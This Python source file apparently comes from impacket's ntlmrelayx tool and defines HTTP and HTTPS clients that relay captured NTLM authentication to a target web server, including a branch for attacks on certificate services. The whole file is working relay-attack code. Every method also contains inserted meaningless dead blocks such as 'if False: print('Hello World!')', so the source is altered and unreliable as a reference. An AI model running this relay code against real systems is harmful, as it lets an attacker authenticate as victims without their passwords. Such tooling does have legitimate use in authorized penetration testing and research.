import re
import ssl
try:
    from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
import base64
from struct import unpack
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED
from impacket.ntlm import NTLMAuthChallenge
from impacket.spnego import SPNEGO_NegTokenResp
PROTOCOL_CLIENT_CLASSES = ['HTTPRelayClient', 'HTTPSRelayClient']

class HTTPRelayClient(ProtocolClient):
    PLUGIN_NAME = 'HTTP'

    def __init__(self, serverConfig, target, targetPort=80, extendedSecurity=True):
        if False:
            print('Hello World!')
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.authenticationMethod = None

    def initConnection(self):
        if False:
            for i in range(10):
                print('nop')
        self.session = HTTPConnection(self.targetHost, self.targetPort)
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        return True

    def sendNegotiate(self, negotiateMessage):
        if False:
            for i in range(10):
                print('nop')
        self.session.request('GET', self.path)
        res = self.session.getresponse()
        res.read()
        if res.status != 401:
            LOG.info('Status code returned: %d. Authentication does not seem required for URL' % res.status)
        try:
            if 'NTLM' not in res.getheader('WWW-Authenticate') and 'Negotiate' not in res.getheader('WWW-Authenticate'):
                LOG.error('NTLM Auth not offered by URL, offered protocols: %s' % res.getheader('WWW-Authenticate'))
                return False
            if 'NTLM' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = 'NTLM'
            elif 'Negotiate' in res.getheader('WWW-Authenticate'):
                self.authenticationMethod = 'Negotiate'
        except (KeyError, TypeError):
            LOG.error('No authentication requested by the server for url %s' % self.targetHost)
            if self.serverConfig.isADCSAttack:
                LOG.info('IIS cert server may allow anonymous authentication, sending NTLM auth anyways')
                self.authenticationMethod = 'NTLM'
            else:
                return False
        negotiate = base64.b64encode(negotiateMessage).decode('ascii')
        headers = {'Authorization': '%s %s' % (self.authenticationMethod, negotiate)}
        self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        res.read()
        try:
            serverChallengeBase64 = re.search('%s ([a-zA-Z0-9+/]+={0,2})' % self.authenticationMethod, res.getheader('WWW-Authenticate')).group(1)
            serverChallenge = base64.b64decode(serverChallengeBase64)
            challenge = NTLMAuthChallenge()
            challenge.fromString(serverChallenge)
            return challenge
        except (IndexError, KeyError, AttributeError):
            LOG.error('No NTLM challenge returned from server')
            return False

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if False:
            print('Hello World!')
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob
        auth = base64.b64encode(token).decode('ascii')
        headers = {'Authorization': '%s %s' % (self.authenticationMethod, auth)}
        self.session.request('GET', self.path, headers=headers)
        res = self.session.getresponse()
        if res.status == 401:
            return (None, STATUS_ACCESS_DENIED)
        else:
            LOG.info('HTTP server returned error code %d, treating as a successful login' % res.status)
            self.lastresult = res.read()
            return (None, STATUS_SUCCESS)

    def killConnection(self):
        if False:
            return 10
        if self.session is not None:
            self.session.close()
            self.session = None

    def keepAlive(self):
        if False:
            while True:
                i = 10
        self.session.request('HEAD', '/favicon.ico')
        self.session.getresponse()

class HTTPSRelayClient(HTTPRelayClient):
    PLUGIN_NAME = 'HTTPS'

    def __init__(self, serverConfig, target, targetPort=443, extendedSecurity=True):
        if False:
            i = 10
            return i + 15
        HTTPRelayClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        if False:
            return 10
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost, self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost, self.targetPort)
        return True